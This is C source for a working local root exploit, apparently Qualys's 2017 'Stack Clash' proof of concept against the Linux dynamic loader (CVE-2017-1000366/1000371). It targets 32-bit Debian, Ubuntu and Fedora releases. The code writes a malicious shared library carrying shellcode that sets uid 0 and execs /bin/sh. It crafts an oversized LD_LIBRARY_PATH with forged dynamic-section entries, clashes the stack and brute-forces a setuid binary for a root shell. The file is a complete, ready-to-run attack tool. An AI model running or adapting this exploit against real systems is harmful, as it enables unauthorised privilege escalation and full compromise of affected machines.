/*
 * Linux_ldso_dynamic.c for CVE-2017-1000366, CVE-2017-1000371
 * Copyright (C) 2017 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <elf.h>
#include <fcntl.h>
#include <limits.h>
#include <link.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define PAGESZ ((size_t)4096)
#define ALIGN ((size_t)16)

#define PIE_BASE ((uintptr_t)0x80000000)
#define PIE_RAND ((size_t)1<<20)

#define STACK_BASE ((uintptr_t)0xC0000000)
#define STACK_RAND ((size_t)8<<20)

#define MAX_ARG_STRLEN ((size_t)128<<10)

static const struct target * target;
static const struct target {
    const char * name;
    const char * repl_lib;
} targets[] = {
    {
        .name = "Debian 9 (stretch)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Debian 10 (buster)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Ubuntu 14.04.5 (Trusty Tahr)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Ubuntu 16.04.2 (Xenial Xerus)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Ubuntu 17.04 (Zesty Zapus)",
        .repl_lib = "lib/i386-linux-gnu",
    },
    {
        .name = "Fedora 23 (Server Edition)",
        .repl_lib = "lib",
    },
    {
        .name = "Fedora 24 (Server Edition)",
        .repl_lib = "lib",
    },
    {
        .name = "Fedora 25 (Server Edition)",
        .repl_lib = "lib",
    },
};

#define die() do { \
    printf("died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

static const ElfW(auxv_t) * my_auxv;

static unsigned long int
my_getauxval (const unsigned long int type)
{
    const ElfW(auxv_t) * p;

    if (!my_auxv) die();
    for (p = my_auxv; p->a_type != AT_NULL; p++)
        if (p->a_type == type)
            return p->a_un.a_val;
    die();
}

struct elf_info {
    uintptr_t map_start, map_end;
    uintptr_t dyn_start, dyn_end;
};

static struct elf_info
get_elf_info(const char * const binary)
{
    static struct elf_info elf;
    const int fd = open(binary, O_RDONLY | O_NOFOLLOW);
    if (fd <= -1) die();
    struct stat st;
    if (fstat(fd, &st)) die();
    if (!S_ISREG(st.st_mode)) die();
    if (st.st_size <= 0) die();
    #define SAFESZ ((size_t)64<<20)
    if (st.st_size >= (ssize_t)SAFESZ) die();
    const size_t size = st.st_size;
    uint8_t * const buf = malloc(size);
    if (!buf) die();
    if (read(fd, buf, size) != (ssize_t)size) die();
    if (close(fd)) die();

    if (size <= sizeof(ElfW(Ehdr))) die();
    const ElfW(Ehdr) * const ehdr = (const ElfW(Ehdr) *)buf;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0) die();
    if (ehdr->e_ident[EI_MAG1] != ELFMAG1) die();
    if (ehdr->e_ident[EI_MAG2] != ELFMAG2) die();
    if (ehdr->e_ident[EI_MAG3] != ELFMAG3) die();
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) die();
    if (ehdr->e_ident[EI_DATA] != ELFDATA2LSB) die();
    if (ehdr->e_type != ET_DYN) die();
    if (ehdr->e_machine != EM_386) die();
    if (ehdr->e_version != EV_CURRENT) die();
    if (ehdr->e_ehsize != sizeof(ElfW(Ehdr))) die();
    if (ehdr->e_phentsize != sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shentsize != sizeof(ElfW(Shdr))) die();
    if (ehdr->e_phoff <= 0 || ehdr->e_phoff >= size) die();
    if (ehdr->e_shoff <= 0 || ehdr->e_shoff >= size) die();
    if (ehdr->e_phnum > (size - ehdr->e_phoff) / sizeof(ElfW(Phdr))) die();
    if (ehdr->e_shnum > (size - ehdr->e_shoff) / sizeof(ElfW(Shdr))) die();

    unsigned int i;
  {
    int interp = 0;
    for (i = 0; i < ehdr->e_phnum; i++) {
        const ElfW(Phdr) * const phdr = (const ElfW(Phdr) *)(buf + ehdr->e_phoff) + i;
        if (phdr->p_type == PT_INTERP) interp = 1;
        if (phdr->p_type != PT_LOAD) continue;
        if (elf.map_start) die();

        if (phdr->p_offset >= size) die();
        if (phdr->p_filesz > size - phdr->p_offset) die();
        if (phdr->p_filesz > phdr->p_memsz) die();
        if (phdr->p_vaddr != phdr->p_paddr) die();
        if (phdr->p_vaddr >= SAFESZ) die();
        if (phdr->p_memsz >= SAFESZ) die();
        if (phdr->p_memsz <= 0) die();
        if (phdr->p_align != PAGESZ) die();

        switch (phdr->p_flags) {
            case PF_R | PF_X:
                if (phdr->p_vaddr) die();
                break;
            case PF_R | PF_W:
                elf.map_start = phdr->p_vaddr & ~(PAGESZ-1);
                elf.map_end = (phdr->p_vaddr + phdr->p_memsz + PAGESZ-1) & ~(PAGESZ-1);
                if (!elf.map_start) die();
                break;
            default:
                die();
        }
    }
    if (!interp) die();
    if (!elf.map_start) die();
  }
    for (i = 0; i < ehdr->e_shnum; i++) {
        const ElfW(Shdr) * const shdr = (const ElfW(Shdr) *)(buf + ehdr->e_shoff) + i;
        if (!(shdr->sh_flags & SHF_ALLOC)) continue;
        if (shdr->sh_size <= 0) die();
        if (shdr->sh_size >= SAFESZ) die();
        if (shdr->sh_addr >= SAFESZ) die();
        #undef SAFESZ
        const uintptr_t start = shdr->sh_addr;
        const uintptr_t end = start + shdr->sh_size;

        if (!(shdr->sh_flags & SHF_WRITE)) {
            if (start < elf.map_end && end > elf.map_start) die();
            continue;
        }
        if (start < elf.map_start || end > elf.map_end) die();
        if (shdr->sh_type != SHT_DYNAMIC) continue;
        if (shdr->sh_entsize != sizeof(ElfW(Dyn))) die();

        if (elf.dyn_start) die();
        elf.dyn_start = start;
        elf.dyn_end = end;
        if (!elf.dyn_start) die();
    }
    if (!elf.dyn_start) die();
    free(buf);
    return elf;
}

static void
create_needed_lib(const char * const needed)
{
    static struct lib {
        union {
            struct {
                ElfW(Ehdr) e;
                ElfW(Phdr) p1;
                ElfW(Phdr) p2;
                ElfW(Phdr) p3;
            } h;
            char align[PAGESZ];
        } u;
        char code1[PAGESZ];
        char code3[PAGESZ];
        char code2[8<<20];
    } lib = { .u = { .h = {
        .e = {
            .e_ident = {
                ELFMAG0,
                ELFMAG1,
                ELFMAG2,
                ELFMAG3,
                ELFCLASS32,
                ELFDATA2LSB,
                EV_CURRENT,
                ELFOSABI_SYSV,
                0
            },
            .e_type = ET_DYN,
            .e_machine = EM_386,
            .e_version = EV_CURRENT,
            .e_phoff = offsetof(struct lib, u.h.p1),
            .e_ehsize = sizeof(ElfW(Ehdr)),
            .e_phentsize = sizeof(ElfW(Phdr)),
            .e_phnum = 3
        },
        .p1 = {
            .p_type = PT_LOAD,
            .p_offset = offsetof(struct lib, code1),
            .p_vaddr = 0,
            .p_filesz = sizeof(lib.code1),
            .p_memsz = sizeof(lib.code1),
            .p_flags = PF_R | PF_X,
            .p_align = PAGESZ
        },
        .p2 = {
            .p_type = PT_LOAD,
            .p_offset = offsetof(struct lib, code2),
            .p_vaddr = -(sizeof(lib.code2) + PAGESZ),
            .p_filesz = sizeof(lib.code2),
            .p_memsz = sizeof(lib.code2),
            .p_flags = PF_R | PF_X,
            .p_align = PAGESZ
        },
        .p3 = {
            .p_type = PT_LOAD,
            .p_offset = offsetof(struct lib, code3),
            .p_vaddr = sizeof(lib.code1),
            .p_filesz = sizeof(lib.code3),
            .p_memsz = sizeof(lib.code3),
            .p_flags = PF_R | PF_X,
            .p_align = PAGESZ
        }
    }}};

    static const char shellcode[] =
        "\x83\xc4\x40\xb8\x17\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xb8"
        "\x2e\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00"
        "\xbb\x00\x00\x00\x00\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00"
        "\x00\xbb\x00\x00\x00\x00\xb9\x02\x00\x00\x00\xcd\x80\xb8\x0b\x00"
        "\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xba\x00"
        "\x00\x00\x00\x52\x53\x89\xe1\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00"
        "\x00\x00\x00\xcd\x80";

    memset(lib.code2, 0x90, sizeof(lib.code2));
    if (sizeof(lib.code2) <= sizeof(shellcode)) die();
    memcpy(lib.code2 + sizeof(lib.code2) - sizeof(shellcode), shellcode, sizeof(shellcode));

    const int fd = open(needed, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
    if (fd <= -1) die();
    if (write(fd, &lib, sizeof(lib)) != (ssize_t)sizeof(lib)) die();
    if (fchmod(fd, 0755)) die();
    if (close(fd)) die();
}

static const char my_x86_platforms[4][5] = {
    "i386", "i486", "i586", "i686"
};

int
main(const int my_argc, const char * const my_argv[], const char * const my_envp[])
{
  {
    const char * const * p = my_envp;
    while (*p++) ;
    my_auxv = (const void *)p;
  }
    if (my_getauxval(AT_PAGESZ) != PAGESZ) die();

    if (my_argc != 1+2) {
        printf("Usage: %s target binary\n", my_argv[0]);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            printf("Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(my_argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    printf("Target %zu %s\n", i, target->name);
  }
    const char * const binary = realpath(my_argv[2], NULL);
    if (!binary) die();
    if (*binary != '/') die();
    if (access(binary, R_OK | X_OK)) die();

    const struct elf_info elf = get_elf_info(binary);
    printf("map_start -> dyn_end = %u\n", elf.dyn_end - elf.map_start);
    printf("dyn_start -> dyn_end = %u\n", elf.dyn_end - elf.dyn_start);
    printf("dyn_start -> map_end = %u\n", elf.map_end - elf.dyn_start);
    printf("dyn_end -> map_end = %u\n", elf.map_end - elf.dyn_end);

    const char * const slash = strrchr(binary, '/');
    if (!slash) die();
    if (slash <= binary) die();
    const char * const origin = strndup(binary, slash - binary);
    if (!origin) die();
    printf("origin %s (%zu)\n", origin, strlen(origin));

    const char * const platform = (const void *)my_getauxval(AT_PLATFORM);
    if (!platform) die();
    const size_t platform_len = strlen(platform);
    if (platform_len != 4) die();
  {
    size_t i;
    for (i = 0; ; i++) {
        if (i >= sizeof(my_x86_platforms) / sizeof(my_x86_platforms[0])) die();
        if (strcmp(platform, my_x86_platforms[i]) == 0) break;
    }
  }
    const struct {
        const char * str;
        size_t len;
        size_t repl_len;
    } DSTs[] = {
        #define DST_LIB "LIB"
        { DST_LIB, strlen(DST_LIB), strlen(target->repl_lib) },
        #define DST_PLATFORM "PLATFORM"
        { DST_PLATFORM, strlen(DST_PLATFORM), platform_len }
    };
    size_t repl_max = strlen(origin);
  {
    size_t i;
    for (i = 0; i < sizeof(DSTs)/sizeof(*DSTs); i++) {
        if (repl_max < DSTs[i].repl_len)
            repl_max = DSTs[i].repl_len;
    }
  }
    printf("repl_max %zu\n", repl_max);
    if (repl_max < 4) die();

    static struct {
        double probability;
        size_t len, gwr, cnt, dst;
    } best;

    #define LLP "LD_LIBRARY_PATH="
    static char llp[MAX_ARG_STRLEN];
    #define MAX_GWR (sizeof(llp) - sizeof(LLP))
  {
    size_t len;
    for (len = MAX_GWR; len >= ALIGN; len -= ALIGN) {
        size_t gwr;
        for (gwr = len; gwr >= elf.dyn_end - elf.dyn_start; gwr--) {
            size_t dst;
            for (dst = 0; dst < sizeof(DSTs)/sizeof(*DSTs); dst++) {
                const size_t cnt = (len - gwr) / (1 + DSTs[dst].len + 1);
                const size_t gpj = (len + ((repl_max > 4) ? (cnt * (repl_max - 4)) : 0) + 1 + (ALIGN-1)) & ~(ALIGN-1);
                const size_t bwr = cnt * (DSTs[dst].repl_len + 1) + ((len - gwr) - cnt * (1 + DSTs[dst].len + 1)) + 1;

                if (gwr + bwr >= elf.map_end - elf.dyn_start) continue;
                const size_t min = MIN(gwr, elf.dyn_end - elf.map_start);
                if (gpj <= min + (elf.map_end - elf.dyn_end) + 3 * PAGESZ) continue;

                const double probability = (double)min / (double)(PIE_RAND + STACK_RAND);
                if (best.probability < probability) {
                    best.probability = probability;
                    best.len = len;
                    best.gwr = gwr;
                    best.cnt = cnt;
                    best.dst = dst;
                    printf("len %zu gpj %zu gwr %zu bwr %zu cnt %zu dst %zu repl %zu probability 1/%zu (%.10g)\n",
                            len, gpj, gwr, bwr, cnt, DSTs[dst].len, DSTs[dst].repl_len, (size_t)(1 / probability), probability);
                }
            }
        }
    }
  }
    if (!best.probability) die();
    if (STACK_BASE <= PIE_BASE) die();
    const size_t stack_size = (STACK_BASE - PIE_BASE) - (PIE_RAND/2 + elf.map_end + STACK_RAND/2);
    printf("stack_size %zu\n", stack_size);

    #define STRTAB_SIZE (2 * STACK_RAND)
    #define NEEDED "./3456789abcdef"
    if (sizeof(NEEDED) != ALIGN) die();
    static union {
        uintptr_t p;
        char s[sizeof(void *)];
    } strtab_addr;
  {
    static const ElfW(Dyn) dyn;
    if (sizeof(strtab_addr) != sizeof(dyn.d_un)) die();
    if (sizeof(strtab_addr.p) != sizeof(dyn.d_un)) die();
    if (sizeof(strtab_addr.s) != sizeof(dyn.d_un)) die();
  }
  {
    uintptr_t needed_addr = STACK_BASE - STACK_RAND/2 - STRTAB_SIZE/2;
    const uintptr_t first_needed_addr = needed_addr;
    for (;; needed_addr += sizeof(NEEDED)) {
        if (needed_addr % sizeof(NEEDED)) die();
        strtab_addr.p = needed_addr / 2;
        size_t i;
        for (i = 0; i < sizeof(strtab_addr.s); i++) {
            if (strchr("$:;\\", strtab_addr.s[i])) {
                if (i >= 3) die();
                break;
            }
        }
        if (i >= sizeof(strtab_addr.s)) break;
    }
    printf("needed %08x -> %08x (first %08x -> %08x)\n",
            needed_addr, strtab_addr.p, first_needed_addr,
            needed_addr - first_needed_addr);
    if (needed_addr < first_needed_addr) die();
    if (needed_addr - first_needed_addr >= STACK_RAND / 4) die();
  }
    #define INITIAL_STACK_EXPANSION (131072UL)
    const size_t needed_envs = STRTAB_SIZE / sizeof(NEEDED);
    if (needed_envs < INITIAL_STACK_EXPANSION / sizeof(char *)) die();

    static char clash[MAX_ARG_STRLEN];
    memset(clash, ' ', sizeof(clash)-1);
    if ((strlen(clash) + 1) % ALIGN) die();
    const size_t clash_envs = (stack_size - sizeof(llp) - needed_envs * (sizeof(char *) + sizeof(NEEDED)))
                              / (sizeof(char *) + sizeof(clash));
    printf("#needed %zu #clash %zu\n", needed_envs, clash_envs);

  {
    char * cp = mempcpy(llp, LLP, sizeof(LLP)-1);
    memset(cp, '/', best.len);
    const char * const bwrp = cp + best.gwr;
    cp += elf.dyn_start % ALIGN;
    if (cp >= bwrp) die();
   {
    static const ElfW(Dyn) dyn;
    for (; bwrp - cp >= (ptrdiff_t)sizeof(dyn); cp += sizeof(dyn)) {
        ElfW(Dyn) * const dynp = (void *)cp;
        dynp->d_tag = DT_AUXILIARY;
        dynp->d_un.d_ptr = strtab_addr.p;
    }
   }
    if (cp > bwrp) die();
    cp = (char *)bwrp;
    if (!best.cnt) die();
    if (best.dst >= sizeof(DSTs)/sizeof(*DSTs)) die();
    size_t i;
    for (i = 0; i < best.cnt; i++) {
        *cp++ = '$';
        cp = mempcpy(cp, DSTs[best.dst].str, DSTs[best.dst].len);
        *cp++ = '/';
    }
    if (cp >= llp + sizeof(llp)) die();
    if ((strlen(llp) + 1) % ALIGN) die();
    if ((strlen(llp) + 1) != sizeof(LLP) + best.len) die();
  }

    #define LHCM "LD_HWCAP_MASK="
    static char lhcm[64];
  {
    const int width = ALIGN - (sizeof(LHCM) + strlen(binary) + 1 + sizeof(void *)) % ALIGN;
    if (width <= 0) die();
    if ((unsigned int)width > ALIGN) die();
    if ((unsigned int)snprintf(lhcm, sizeof(lhcm), "%s%0*u", LHCM, width, 0)
                                  >= sizeof(lhcm)) die();
    if (strlen(lhcm) + 1 != sizeof(LHCM) + width) die();
  }

    const size_t args = 2 + clash_envs + needed_envs + 1;
    char ** const argv = calloc(args, sizeof(char *));
    if (!argv) die();
  {
    char ** ap = argv;
    *ap++ = (char *)binary;
    *ap++ = "--help";
    size_t i;
    for (i = 0; i < clash_envs; i++) {
        *ap++ = clash;
    }
    for (i = 0; i < needed_envs; i++) {
        *ap++ = NEEDED;
    }
    *ap++ = NULL;
    if (ap != argv + args) die();
  }

    const size_t envs = 1 + 2;
    char ** const envp = calloc(envs, sizeof(char *));
    if (!envp) die();
  {
    char ** ep = envp;
    *ep++ = llp;
    *ep++ = lhcm;
    *ep++ = NULL;
    if (ep != envp + envs) die();
  }

  {
    static const struct rlimit rlimit_stack = { RLIM_INFINITY, RLIM_INFINITY };
    if (setrlimit(RLIMIT_STACK, &rlimit_stack)) die();
  }
    int pipefd[2];
    if (pipe(pipefd)) die();
    if (close(pipefd[0])) die();
    pipefd[0] = -1;
    if (signal(SIGPIPE, SIG_DFL) == SIG_ERR) die();

    create_needed_lib(NEEDED);

    size_t try;
    for (try = 1; try <= 65536; try++) {
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(pipefd[1], 1) != 1) die();
            if (dup2(pipefd[1], 2) != 2) die();
            execve(*argv, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGPIPE:
                case SIGSEGV:
                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}